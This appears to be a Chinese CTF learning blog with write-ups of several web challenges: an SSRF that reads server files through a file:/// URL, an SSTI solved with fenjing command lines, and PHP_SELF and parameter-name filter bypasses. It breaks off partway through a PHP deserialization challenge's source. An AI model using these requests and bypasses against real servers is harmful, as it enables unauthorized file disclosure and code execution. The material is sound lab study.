aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br></code></pre></td></tr></table></figure>

<h1 id="LitCTF-2025-easy-signin"><a href="#LitCTF-2025-easy-signin" class="headerlink" title="[LitCTF 2025]easy_signin"></a>[LitCTF 2025]easy_signin</h1><p>开题先是无法访问，扫目录扫出这些：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[01:51:25] 301 -  169B  - /api  -&gt;  http://node6.anna.nssctf.cn/api/<br>[01:51:26] 301 -  169B  - /backup  -&gt;  http://node6.anna.nssctf.cn/backup/<br>[01:51:29] 302 -    0B  - /dashboard.php  -&gt;  /login.html<br>[01:51:34] 200 -    6KB - /login.html<br>[01:51:34] 200 -   51B  - /login.php<br></code></pre></td></tr></table></figure>
<p>访问login.php<br>回显：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">400</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>53c2<span class="hljs-char escape_">\u</span>6570<span class="hljs-char escape_">\u</span>4e0d<span class="hljs-char escape_">\u</span>5b8c<span class="hljs-char escape_">\u</span>6574&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
<p>访问html<br>到一个登录界面  </p>
<p>抓包尝试了一下，发现username和password是md5加密过的</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node6.anna.nssctf.cn:28934<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>107<br><span class="hljs-attribute">X-Sign</span><span class="hljs-punctuation">: </span>f6b57bb04015bf000f17e5d5dda37935<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node6.anna.nssctf.cn:28934<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node6.anna.nssctf.cn:28934/login.html<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1748528050<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-apache"><span class="hljs-attribute">username</span>=ee11cbb19052e40b07aac0ca060c23ee&amp;password=<span class="hljs-number">202</span>cb962ac59075b964b07152d234b70&amp;timestamp=<span class="hljs-number">1748714891098</span></span><br></code></pre></td></tr></table></figure>
<p>尝试对admin 密码爆破没结果<br>user 尝试一直提示账户错误没结果<br>去看wp<br>说是有api口能知道有地方能ssrf  </p>
<p>浏览器中f12查看网络去向能看到一个api地址  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://node6.anna.nssctf.cn:28934/api.js<br>访问看到：<br>/api/sys/urlcode.php?url=<br></code></pre></td></tr></table></figure>
<p>然后  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node6.anna.nssctf.cn:<span class="hljs-number">28934</span><span class="hljs-regexp">/api/</span>sys<span class="hljs-regexp">/urlcode.php?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html/login.php<br><br>看不见哦<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://node6.anna.nssctf.cn:28934/api/sys/urlcode.php?url=file:///var/www/html/api/sys/urlcode.php">http://node6.anna.nssctf.cn:28934/api/sys/urlcode.php?url=file:///var/www/html/api/sys/urlcode.php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!?php<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$url</span>)&#123;<br><br>    <span class="hljs-variable">$forbidden_protocols</span> = [<span class="hljs-string">&#x27;ftp://&#x27;</span>, <span class="hljs-string">&#x27;php://&#x27;</span>, <span class="hljs-string">&#x27;zlib://&#x27;</span>, <span class="hljs-string">&#x27;data://&#x27;</span>, <span class="hljs-string">&#x27;glob://&#x27;</span>, <span class="hljs-string">&#x27;phar://&#x27;</span>, <span class="hljs-string">&#x27;ssh2://&#x27;</span>, <span class="hljs-string">&#x27;rar://&#x27;</span>, <span class="hljs-string">&#x27;ogg://&#x27;</span>, <span class="hljs-string">&#x27;expect://&#x27;</span>];<br>    <span class="hljs-variable">$protocol_block</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$forbidden_protocols</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$proto</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-variable">$proto</span>) === <span class="hljs-number">0</span>) &#123;  <br>            <span class="hljs-variable">$protocol_block</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$log_block</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;.log&#x27;</span>) !== <span class="hljs-literal">false</span>;  <br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$protocol_block</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;禁止访问：不允许使用 <span class="hljs-subst">&#123;$proto&#125;</span> 协议&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$log_block</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;禁止访问：URL 包含 .log&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;login.php&#x27;</span>) !== <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;dashboard.php&#x27;</span>) !== <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$url</span>, <span class="hljs-string">&#x27;327a6c4304ad5938eaf0efb6cc3e53dc.php&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看不见哦&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;b--&gt;</span><br></code></pre></td></tr></table></figure>
<p>然后看到里面有个327a6c4304ad5938eaf0efb6cc3e53dc.php<br>在主解析访问直接得到flag  </p>
<p>看到有大佬写马的wp<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TouHp/p/18895822">https://www.cnblogs.com/TouHp/p/18895822</a><br>看不懂，先供着  </p>
<h1 id="LitCTF-2025-星愿信箱"><a href="#LitCTF-2025-星愿信箱" class="headerlink" title="[LitCTF 2025]星愿信箱"></a>[LitCTF 2025]星愿信箱</h1><p>原来这题直接用fenjing就能梭出来的，这倒是发现了我环境的问题<br>以前是直接在powershell 跑fenjing web ui 版，<br>一直跑不出来<br>去式了别人wp的fenjing指令也不行，<br>给d导看了，原来是powershell的字符需要转译  </p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">原指令：  <br><span class="hljs-string">fenjing</span> <span class="hljs-string">crack-json</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&#x27;http://node6.anna.nssctf.cn:28919/&#x27;</span> <span class="hljs-built_in">--json-data</span> <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;: &quot;a&quot;&#125;&#x27;</span> <span class="hljs-built_in">--key</span> <span class="hljs-string">cmd</span> <span class="hljs-built_in">--replaced-keyword-strategy</span> <span class="hljs-string">ignore</span>  <br>用不出来，一直提示报错  <br><br><span class="hljs-string">d</span>导给的命令:  <br><span class="hljs-string">fenjing</span> <span class="hljs-string">crack-json</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&#x27;http://node6.anna.nssctf.cn:28919/&#x27;</span> <span class="hljs-built_in">--json-data</span> <span class="hljs-string">&#x27;&#123;\&quot;cmd\&quot;: \&quot;a\&quot;&#125;&#x27;</span> <span class="hljs-built_in">--key</span> <span class="hljs-string">cmd</span> <span class="hljs-built_in">--replaced-keyword-strategy</span> <span class="hljs-string">ignore</span>    <br><br></code></pre></td></tr></table></figure>
<p>要不说以后fenjing在linux里跑？<br>没用，在Linux下跑的fenjing webui 还是无法成功<br>看来只能用命令跑了</p>
<h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><p>开题先见源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>只看一眼，看上去像是猜谜游戏，过滤了：<br>‘&#x2F;utils.php/*$&#x2F;i’<br>‘&#x2F;show_source&#x2F;‘   </p>
<p>但是又设置又’&#x2F;show_source&#x2F;‘成功传入后的结果，所以应该是能绕过正则过滤的<br>不管了，问ai  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 引入名为 utils.php 的文件，该文件可能包含一些辅助功能或变量定义。</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-comment">// 判断是否存在名为 &#x27;guess&#x27; 的 POST 请求参数。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 将 POST 请求中的 &#x27;guess&#x27; 参数值强制转换为字符串类型，并赋值给变量 $guess。</span><br>    <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-comment">// 判断用户提交的猜测值 $guess 是否与变量 $secret 相等。</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-comment">// 如果猜测正确，将提示信息和 $flag 变量的值拼接后赋值给 $message。</span><br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果猜测错误，提示用户重新尝试。</span><br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 检查当前脚本的路径是否以 &quot;utils.php&quot; 结尾（不区分大小写），如果是，则终止脚本运行，防止直接访问 utils.php 文件。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 检查请求的 URI 是否包含 &quot;show_source&quot; 字符串，如果是，则终止脚本运行，防止显示源代码。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 判断是否存在名为 &#x27;show_source&#x27; 的 GET 请求参数。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 如果存在，则使用 highlight_file 函数高亮显示当前脚本文件的代码，并终止脚本运行。</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 如果不存在 &#x27;show_source&#x27; GET 参数，则调用 show_source 函数（可能在 utils.php 中定义）显示当前脚本的源代码。</span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><strong>basename($_SERVER[‘PHP_SELF’]) 是什么意思</strong><br>问了ai后<br>那我大概理解是返回当前客户请求的url的最后的文件名字，然后配合highlight_file显示源码  </p>
<p>所以是<br>先绕过  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 检查当前脚本的路径是否以 &quot;utils.php&quot; 结尾（不区分大小写），如果是，则终止脚本运行，防止直接访问 utils.php 文件。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>看网上wp的办法是在url的实际路径上添加不影响路径解析的字符  </p>
<p>问ai找出能用的：  </p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">零宽度空格（Zero-Width Space）<br>编码：<span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%8</span>B<br>描述：表示零宽度空格。<br>潜在影响：可能导致路径解析错误或绕过某些基于字符串匹配的安全检查。<br><br>其他 Unicode 空白字符<br>全角空格：<span class="hljs-variable">%EF</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%A0</span>（全角空格）<br>半角空格：<span class="hljs-variable">%20</span>（普通空格）<br>中文标点符号：如 <span class="hljs-variable">%E3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%81</span>（中文逗号）、<span class="hljs-variable">%E3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%82</span>（中文句号）等<br>潜在影响：这些字符可能会被误认为普通空格或路径分隔符，从而绕过某些基于字符串匹配的安全检查。<br></code></pre></td></tr></table></figure>

<p>然后是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 检查请求的 URI 是否包含 &quot;show_source&quot; 字符串，如果是，则终止脚本运行，防止显示源代码。</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>的绕过<br>我看有wp是直接用<br>show+source直接绕过<br>问dp说不应该，正常是url编码下滑线来匹配显示源码的条件    </p>
<p><strong>继续追问:</strong><br>为什么这个转换会发生？<br>这是 PHP 的历史遗留行为（为了兼容 register_globals 时代），PHP 会自动转换参数名中的特定字符：</p>
<p>空格 → 下划线 _</p>
<p>点号 . → 下划线 _</p>
<p>其他特殊字符也会被转换</p>
<p>这是 PHP 的默认行为，可以在 php.ini 中通过 request_parameter_handling 配置，但默认是启用的。</p>
<hr>
<h2 id="title-note-38date-2025-06-21-23-33-35tags"><a href="#title-note-38date-2025-06-21-23-33-35tags" class="headerlink" title="title: note-38date: 2025-06-21 23:33:35tags:"></a>title: note-38<br>date: 2025-06-21 23:33:35<br>tags:</h2><h1 id="LitCTF-2025-君の名は"><a href="#LitCTF-2025-君の名は" class="headerlink" title="[LitCTF 2025]君の名は"></a>[LitCTF 2025]君の名は</h1><p>开题先给源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 显示当前文件的源代码</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 关闭所有错误报告</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 创建一个匿名函数，当调用时会执行`/readflag`命令</span><br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br><br><span class="hljs-comment">// 定义Taki类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$musubi</span>; <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$magic</span>;  <span class="hljs-comment">// 私有属性</span><br>    <br>    <span class="hljs-comment">// __unserialize魔术方法，在反序列化时调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;musubi = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;musubi&#x27;</span>]; <span class="hljs-comment">// 从数组中设置musubi属性</span><br>        <span class="hljs-variable language_">$this</span>-&gt;magic = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;magic&#x27;</span>];   <span class="hljs-comment">// 从数组中设置magic属性</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;musubi)();       <span class="hljs-comment">// 调用musubi属性（假设它是可调用的）</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// __call魔术方法，当调用不存在的方法时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-comment">// 动态创建对象并调用方法</span><br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 定义Mitsuha类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$memory</span>;  <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$thread</span>;  <span class="hljs-comment">// 私有属性</span><br>    <br>    <span class="hljs-comment">// __invoke魔术方法，当对象被当作函数调用时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 返回两个属性的连接</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;memory.<span class="hljs-variable language_">$this</span>-&gt;thread;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 定义KatawareDoki类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$soul</span>;           <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$kuchikamizake</span>;  <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;          <span class="hljs-comment">// 私有属性</span><br>    <br>    <span class="hljs-comment">// 